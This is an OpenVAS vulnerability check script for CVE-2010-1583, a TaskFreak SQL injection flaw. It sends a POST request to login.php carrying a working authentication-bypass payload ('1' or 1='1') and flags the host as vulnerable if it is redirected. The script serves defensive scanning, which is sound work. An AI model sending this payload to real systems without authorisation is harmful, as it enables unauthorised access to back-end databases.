##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_task_freak_sql_inj_vuln.nasl 14 2013-10-27 12:33:37Z jan $
#
# Task Freak 'loadByKey()' SQL Injection Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2010 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to view, add, modify or
  delete information in the back-end database.
  Impact Level: Application.";
tag_affected = "TaskFreak version prior to 0.6.3";

tag_insight = "The flaw exists due to the error in 'loadByKey()', which fails to sufficiently
  sanitize user-supplied data before using it in an SQL query.";
tag_solution = "Upgrade to the TaskFreak version 0.6.3
  http://www.taskfreak.com/download.php";
tag_summary = "This host is running Task Freak and is prone SQL Injection
  Vulnerability.";

if(description)
{
  script_id(902052);
  script_version("$Revision: 14 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2010-05-25 13:56:16 +0200 (Tue, 25 May 2010)");
  script_cve_id("CVE-2010-1583");
  script_bugtraq_id(39793);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("Task Freak 'loadByKey()' SQL Injection Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "
  Affected Software/OS:
  " + tag_affected + "
  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.madirish.net/?article=456");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/58241");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/12452");

  script_description(desc);
  script_summary("Check for the version of Task Freak");
  script_category(ACT_GATHER_INFO);
  script_copyright("Copyright (c) 2010 SecPod");
  script_family("Web application abuses");
  script_dependencies("secpod_task_freak_detect.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
  }
  exit(0);
}
		

include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

tfPort = get_http_port(default:80);
if(!get_port_state(tfPort)){
  exit(0);
}

## Get Task Freak version from KB
tfVer = get_kb_item("www/"+ tfPort + "/TaskFreak");
if(!tfVer){
  exit(0);
}

tfVer = eregmatch(pattern:"^(.+) under (/.*)$", string:tfVer);
if(tfVer[2] != NULL)
{
  ## Try an exploit
  filename = string(tfVer[2] + "/login.php");
  host = get_host_name();
  authVariables ="username=+%221%27+or+1%3D%271%22++";

  ## Construct post request
  sndReq = string("POST ", filename, " HTTP/1.1\r\n",
                   "Host: ", host, "\r\n",
                   "User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.4) Gecko/2008111217 Fedora/3.0.4-1.fc10 Firefox/3.0.4\r\n",
                   "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
                   "Accept-Language: en-us,en;q=0.5\r\n",
                   "Keep-Alive: 300\r\n",
                   "Connection: keep-alive\r\n",
                   "Referer: http://", host, filename, "\r\n",
                   "Content-Type: application/x-www-form-urlencoded\r\n",
                   "Content-Length: ", strlen(authVariables), "\r\n\r\n",
                   authVariables);
  rcvRes = http_keepalive_send_recv(port:tfPort, data:sndReq);

  ## Check the Response
  if("Location: index.php?" >< rcvRes){
    security_hole(tfPort);
  }
}
